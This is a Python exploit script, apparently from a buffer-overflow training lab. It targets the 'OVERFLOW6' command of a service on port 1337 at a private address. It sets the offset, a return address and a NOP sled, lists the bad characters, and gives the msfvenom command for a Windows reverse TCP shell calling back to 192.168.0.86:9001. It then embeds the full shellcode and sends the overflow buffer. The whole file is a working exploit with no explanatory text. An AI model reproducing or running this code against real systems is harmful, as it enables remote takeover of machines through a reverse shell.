#!/usr/bin/env python3
import socket

ip = "192.168.0.87"
port = 1337

badchars = "".join([chr(int(hex(x),16)) for x in range(1,256)])
prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # \x03\x12\x50\x62 \xaf\x11\x50\x62
padding = "\x90" * 10

# Badchars: \x00\x08\x2c\xad
# Payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.86 LPORT=9001 EXITFUNC=thread -b "\x00\x08\x2c\xad" -f c
payload = (
"\xd9\xc6\xd9\x74\x24\xf4\xbe\x1e\xc1\x14\x48\x5a\x31\xc9"
"\xb1\x52\x31\x72\x17\x83\xc2\x04\x03\x6c\xd2\xf6\xbd\x6c"
"\x3c\x74\x3d\x8c\xbd\x19\xb7\x69\x8c\x19\xa3\xfa\xbf\xa9"
"\xa7\xae\x33\x41\xe5\x5a\xc7\x27\x22\x6d\x60\x8d\x14\x40"
"\x71\xbe\x65\xc3\xf1\xbd\xb9\x23\xcb\x0d\xcc\x22\x0c\x73"
"\x3d\x76\xc5\xff\x90\x66\x62\xb5\x28\x0d\x38\x5b\x29\xf2"
"\x89\x5a\x18\xa5\x82\x04\xba\x44\x46\x3d\xf3\x5e\x8b\x78"
"\x4d\xd5\x7f\xf6\x4c\x3f\x4e\xf7\xe3\x7e\x7e\x0a\xfd\x47"
"\xb9\xf5\x88\xb1\xb9\x88\x8a\x06\xc3\x56\x1e\x9c\x63\x1c"
"\xb8\x78\x95\xf1\x5f\x0b\x99\xbe\x14\x53\xbe\x41\xf8\xe8"
"\xba\xca\xff\x3e\x4b\x88\xdb\x9a\x17\x4a\x45\xbb\xfd\x3d"
"\x7a\xdb\x5d\xe1\xde\x90\x70\xf6\x52\xfb\x1c\x3b\x5f\x03"
"\xdd\x53\xe8\x70\xef\xfc\x42\x1e\x43\x74\x4d\xd9\xa4\xaf"
"\x29\x75\x5b\x50\x4a\x5c\x98\x04\x1a\xf6\x09\x25\xf1\x06"
"\xb5\xf0\x56\x56\x19\xab\x16\x06\xd9\x1b\xff\x4c\xd6\x44"
"\x1f\x6f\x3c\xed\x8a\x8a\xd7\xd2\xe3\x94\x71\xbb\xf1\x94"
"\x5e\x12\x7f\x72\xca\x74\x29\x2d\x63\xec\x70\xa5\x12\xf1"
"\xae\xc0\x15\x79\x5d\x35\xdb\x8a\x28\x25\x8c\x7a\x67\x17"
"\x1b\x84\x5d\x3f\xc7\x17\x3a\xbf\x8e\x0b\x95\xe8\xc7\xfa"
"\xec\x7c\xfa\xa5\x46\x62\x07\x33\xa0\x26\xdc\x80\x2f\xa7"
"\x91\xbd\x0b\xb7\x6f\x3d\x10\xe3\x3f\x68\xce\x5d\x86\xc2"
"\xa0\x37\x50\xb8\x6a\xdf\x25\xf2\xac\x99\x29\xdf\x5a\x45"
"\x9b\xb6\x1a\x7a\x14\x5f\xab\x03\x48\xff\x54\xde\xc8\x1f"
"\xb7\xca\x24\x88\x6e\x9f\x84\xd5\x90\x4a\xca\xe3\x12\x7e"
"\xb3\x17\x0a\x0b\xb6\x5c\x8c\xe0\xca\xcd\x79\x06\x78\xed"
"\xab"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")